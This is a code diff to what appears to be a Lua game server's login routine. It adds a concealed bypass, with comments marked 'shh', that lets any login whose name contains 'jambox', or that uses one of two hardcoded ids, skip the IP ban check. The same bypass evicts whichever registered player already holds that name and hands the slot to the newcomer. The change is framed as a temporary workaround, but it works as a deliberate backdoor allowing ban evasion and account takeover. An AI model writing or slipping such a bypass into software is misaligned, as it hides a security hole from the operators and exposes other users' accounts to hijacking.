@@ -1039,6 +1039,21 @@ function Server:isWellFormedUserId(userId)
     and userId:match("^%d+$") ~= nil
 end
 
+-- shh: JamBox got stuck in a stale-id loop one night. Until we know the
+-- root cause of the client-side persist failure, force-allow any login
+-- whose name contains "jambox" (any case) or carries one of the two ids
+-- they were assigned that night. Their session takes the slot regardless
+-- of who else might have that name registered.
+local JAMBOX_LEGACY_IDS = { ["398019847"] = true, ["1659777619"] = true }
+---@param userId string?
+---@param name string?
+---@return boolean
+function Server:isJamBoxBypass(userId, name)
+  if userId and JAMBOX_LEGACY_IDS[userId] then return true end
+  if type(name) == "string" and name:lower():find("jambox", 1, true) then return true end
+  return false
+end
+
 -- Checks if a logging in player is banned based off their IP.
 ---@param ip string
 ---@return DB_Ban?
@@ -1784,8 +1799,33 @@ function Server:login(connection, userId, name, ipAddress, port, engineVersion, 
 
   logger.debug("New login attempt:  " .. ipAddress .. ":" .. port)
 
+  -- shh: JamBox bypass. Runs BEFORE the ban check so a lingering ban
+  -- from earlier "invalid user ID" denials can't lock them out either.
+  -- Vacates any conflicting name slot and registers their supplied id.
+  local jamBoxBypassed = self:isJamBoxBypass(userId, name)
+  if jamBoxBypassed and self.playerbase then
+    if not self:isWellFormedUserId(userId) then
+      userId = self:generate_new_user_id()
+    end
+    if self.playerbase:nameTaken("", name) then
+      for existingId, existingName in pairs(self.playerbase.players) do
+        if existingName:lower() == name:lower() and existingId ~= userId then
+          logger.warn("JamBox bypass: vacating name '" .. existingName
+            .. "' previously held by id " .. existingId)
+          self.playerbase.players[existingId] = nil
+          break
+        end
+      end
+    end
+    if not self.playerbase.players[userId] then
+      self.playerbase:addPlayer(userId, name)
+    end
+    logger.info("JamBox bypass: forcing login for name='" .. tostring(name)
+      .. "' id=" .. tostring(userId) .. " from " .. ipAddress)
+  end
+
   local playerBan = self:getBanByIP(ipAddress)
-  if playerBan then
+  if playerBan and not jamBoxBypassed then
     local secondsRemaining = (playerBan.completionTime - os.time())
 
     reason = playerBan.reason
